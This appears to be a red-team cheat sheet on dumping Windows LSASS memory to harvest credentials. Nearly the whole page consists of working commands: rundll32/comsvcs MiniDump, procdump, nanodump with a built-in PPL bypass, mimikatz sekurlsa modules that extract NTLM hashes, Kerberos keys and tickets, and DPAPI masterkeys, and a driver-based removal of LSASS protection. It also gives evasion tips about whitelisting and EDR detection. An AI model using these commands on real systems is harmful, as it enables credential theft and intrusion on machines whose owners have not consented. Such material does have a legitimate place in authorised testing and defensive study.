---
title: "LSASS"
---

# 🔓 LSASS

> _Local Security Authority Subsystem Service. Caches logon credentials (NTLM, Kerberos keys, sometimes plaintext passwords) in memory - the richest credential source on a running Windows host._

## 🛠️ Tools

- [mimikatz (release)](https://github.com/gentilkiwi/mimikatz/releases)
- [nanodump.x64.exe](https://github.com/fortra/nanodump/blob/main/dist/nanodump.x64.exe)

### Dump methods

> From the GUI: Task Manager > `lsass.exe` right-click > Create dump file.

::: code-group

```cmd [cmd]
tasklist /fi "imagename eq lsass.exe"   # get PID
rundll32 C:\windows\system32\comsvcs.dll, MiniDump $PID C:\Windows\Temp\lsass.dmp full
```

```powershell [PowerShell]
(Get-Process lsass).Id   # get PID
rundll32 C:\windows\system32\comsvcs.dll, MiniDump $PID C:\Windows\Temp\lsass.dmp full
```

```cmd [procdump]
procdump.exe -accepteula -ma lsass.exe lsass.dmp   # signed Sysinternals binary, often whitelisted
```

```bash [nanodump]
# Basic dump (invalid signature by default, use --valid for parsing)
nanodump.x64.exe --write C:\Windows\Temp\lsass.dmp --valid

# Built-in PPL bypass (no signed driver needed)
nanodump.x64.exe --ppl --write C:\Windows\Temp\lsass.dmp
```

:::

### Privileges required

- Local Administrator (or SYSTEM)
- PPL (Protected Process Light) may block dumping on Windows 10/11 -> see [PPL bypass](#ppl-bypass-windows-10-11)

### Live parsing (no dump file)

```bash
mimikatz # privilege::debug
mimikatz # sekurlsa::logonPasswords
```

### Check if PPL is enabled

```powershell
Get-Process lsass | Select-Object ProcessName, @{Name='Protected';Expression={$_.ProtectedProcess}}

# via reg
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL
```

### Extract credentials from dump

::: code-group

```bash [pypykatz]
pypykatz lsa minidump lsass.dmp --quiet
pypykatz lsa minidump lsass.dmp | grep -i "ntlm" # NTLM only
```

```bash [mimikatz]
sekurlsa::minidump C:\lsass.dmp         # load the dump
sekurlsa::logonPasswords                # passwords + NTLM + Kerberos keys
sekurlsa::tickets /export               # Kerberos tickets -> .kirbi files
sekurlsa::msv                           # LM/NTLM hashes only
sekurlsa::ekeys                         # Kerberos AES/RC4 keys
sekurlsa::dpapi                         # cached DPAPI masterkeys of logged-on users
```

:::

### PPL bypass (Windows 10/11)

```bash
mimikatz # !+                                          # load mimidrv.sys - loud (DSE + EDR will flag)
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # privilege::debug
mimikatz # sekurlsa::logonPasswords
```

> _Prefer nanodump's built-in `--ppl` or an in-memory shellcode loader for live engagements._
